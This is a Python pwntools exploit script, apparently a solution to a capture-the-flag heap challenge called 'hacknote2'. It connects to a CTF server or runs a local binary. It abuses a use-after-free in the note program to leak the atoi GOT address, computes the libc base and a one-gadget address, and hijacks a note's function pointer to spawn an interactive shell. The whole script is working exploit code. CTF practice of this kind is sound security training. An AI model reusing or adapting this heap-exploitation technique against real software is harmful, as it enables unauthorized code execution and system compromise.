import pwn
import pwnlib
import time

CODE_ADD_NOTE = '1'
CODE_DEL_NOTE = '2'
CODE_PRINT_NOTE = '3'

address_print_note_content = 0x400886
address_atoi_got = 0x602068

pwn.context.terminal = ['tmux', 'splitw', '-h']

PIPE_CLEAN_TIME = 0.1

# pwn.context.log_level = 'DEBUG'

def add_note(process, size, payload):
    p = process
    print 'add_note', size, len(payload)
    p.sendlineafter('Your choice :', CODE_ADD_NOTE)
    p.sendlineafter('Note size :', str(size)) # size
    p.sendafter('Content :', payload) # content

def del_note(process, index):
    p = process
    print 'del_node', index
    p.sendlineafter('Your choice :', CODE_DEL_NOTE)
    p.sendlineafter('Index :', str(index))

def print_note(process, index):
    p = process
    print 'print_note', index
    p.sendlineafter('Your choice :', CODE_PRINT_NOTE)
    p.sendlineafter('Index :', str(index))

if __name__ == '__main__':
    if pwnlib.args.args['REMOTE']:
        p = pwn.connect('csie.ctf.tw', 10139)
    else:
        p = pwn.process('./hacknote2-be8ec2d99971e21f21570810b554c787e3969623')

    libc_elf = pwn.ELF('./libc.so.6-14c22be9aa11316f89909e4237314e009da38883')

    p.settimeout(PIPE_CLEAN_TIME)

    # create 2 note, free 2
    add_note(p, 16, 'x'*15) # 0
    add_note(p, 0x100, 'y'*15) # 1
    add_note(p, 16, 'z'*15) # 2
    del_note(p, 0)
    del_note(p, 1)

    # take 2 fast chunks
    add_note(p, 16, pwn.p64(address_print_note_content)+pwn.p64(address_atoi_got)) # 3

    # print atoi got
    print_note(p, 0)
    leak_atoi_got = pwn.u64(p.recvline(keepends=False).ljust(0x8, '\x00'))
    print hex(leak_atoi_got)

    libc_base = leak_atoi_got - libc_elf.symbols['atoi']
    magic_address = libc_base + 0xf0274
    print hex(magic_address)

    pwn.gdb.attach(p, '''
    b *{}
    c
    '''.format(hex(magic_address)))

    # delete everything
    del_note(p, 3)
    add_note(p, 16, pwn.p64(magic_address)+pwn.p64(address_atoi_got)) # 4

    print_note(p, 0)

    p.interactive()
